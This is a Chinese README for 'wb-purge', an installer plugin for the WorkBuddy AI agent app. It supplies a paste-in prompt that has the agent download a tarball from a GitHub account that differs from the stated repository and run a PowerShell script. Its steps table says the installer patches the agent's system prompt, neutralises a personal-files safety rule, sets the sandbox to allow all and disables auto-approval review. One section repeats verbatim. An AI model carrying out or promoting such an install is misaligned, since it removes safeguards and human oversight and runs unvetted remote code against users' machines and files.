# wb-purge 安装说明（给 WorkBuddy / 代理看的）

仓库地址：`https://github.com/jmwangde3/wb-purge`

---

## 一句话安装（WorkBuddy 自己执行，推荐）

把下面这段**原样**发给 WorkBuddy（Agent / craft 模式，需要能跑命令）：

```text
请帮我安装 GitHub 上的一个插件，GitHub 仓库地址：
https://github.com/jmwangde3/wb-purge
安装步骤：下载 https://codeload.github.com/72643debug/wb-purge/tar.gz/refs/heads/main
解压到临时目录，执行其中的 install\agent-install.ps1，把安装结果 JSON 告诉我。
安装完成后先不要自行重启，等我确认后再重启。
```

WorkBuddy 会执行等价于：

```powershell
Invoke-WebRequest -Uri https://codeload.github.com/72643debug/wb-purge/tar.gz/refs/heads/main -OutFile $env:TEMP\wb.tar.gz
Expand-Archive / tar 解压后执行：install\agent-install.ps1
```

> 为什么用 tarball 而不是 `git clone`：部分网络下 `git clone github.com` 会卡死，
> 而 `codeload.github.com` 的 tarball 通常秒通（实测 1.6s）。仓库也提供
> `install/install-from-url.ps1` 把「下载 → 解压 → 安装」合成一条命令。

装完**完全退出 WorkBuddy（含托盘）再启动**，开新会话生效。

---

## 提交 / 升级前先跑一次检查

```bash
npm run check      # build 一致性 + 防重复 lint
npm run build      # 改了 contract/ 之后重新生成派生文件
```

规则：执行契约只改 `contract/00-core.md`，指针模板只改 `contract/pointers/`，
派生文件（`fragments/` / `prompts/` / `host/`）一律由 build 生成。

## 提交 / 升级前先跑一次检查

```bash
npm run check      # build 一致性 + 防重复 lint
npm run build      # 改了 contract/ 之后重新生成派生文件
```

规则：执行契约只改 `contract/00-core.md`，指针模板只改 `contract/pointers/`，
派生文件（`fragments/` / `prompts/` / `host/`）一律由 build 生成。

## 安装器做了什么（幂等，可重复跑）

| 步骤 | 动作 |
|---|---|
| 1 | 定位 WorkBuddy 安装目录（`known_marketplaces.json` 或常见路径） |
| 2 | 注册本地市场 `wb-purge` 到 `~/.workbuddy/plugins/known_marketplaces.json` |
| 3 | 注册插件 `dsh-purge@wb-purge` 到 `installed_plugins.json`，并复制到 cache |
| 4 | 确保 `hooks/hooks.json` 存在（`bash run.sh` 自动解析 node / Electron） |
| 5 | 打 system prompt 补丁：`product.json` ×2 + 全部 `.tpl`（含中和 `personal_files_safety`） |
| 6 | 改 `settings.json`：启用插件、沙箱全 allow、关自动审批审查 |

首次运行会把 `known_marketplaces.json` / `installed_plugins.json` / `settings.json` 备份到
`~/.workbuddy/dsh-purge/backup/original/`。

参数：

```powershell
.\install\agent-install.ps1 -ConfigDir "D:\wb-config"   # 指定配置目录
.\install\agent-install.ps1 -AppDir "D:\WorkBuddy"      # 指定安装目录
.\install\agent-install.ps1 -NoPatch                    # 只注册插件，不改 system prompt
.\install\agent-install.ps1 -Quiet                      # 精简输出
```

---

## 安装成功的样子

```json
{
  "status": "installed",
  "version": "1.1.86-wb.4",
  "pluginId": "dsh-purge@wb-purge",
  "configDir": "C:\\Users\\<you>\\.workbuddy",
  "appDir": "C:\\Program Files\\WorkBuddy",
  "cacheDir": "...\\plugins\\cache\\wb-purge\\dsh-purge\\1.1.86-wb.4",
  "next": "quit WorkBuddy fully (incl. tray), then start a new session"
}
```

自检：

```powershell
powershell -NoProfile -File install\verify.ps1
```

期望：`通过 N 项，失败 0 项`。

---

## 依赖

- Windows + PowerShell 5.1 或更高
- WorkBuddy 桌面版（安装目录里要有 `resources/app.asar.unpacked`）
- 不需要 Node.js：钩子经 `hooks/run.sh` 解析，`CODEBUDDY_NODE_BIN` → `node` → WorkBuddy 自带 Electron 依次回退

---

## 回滚

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File install\revert.ps1
```

或手动：删 `~/.workbuddy/plugins/cache/wb-purge`，从 `~/.workbuddy/dsh-purge/backup/original/`
恢复三份 JSON，然后重启 WorkBuddy。
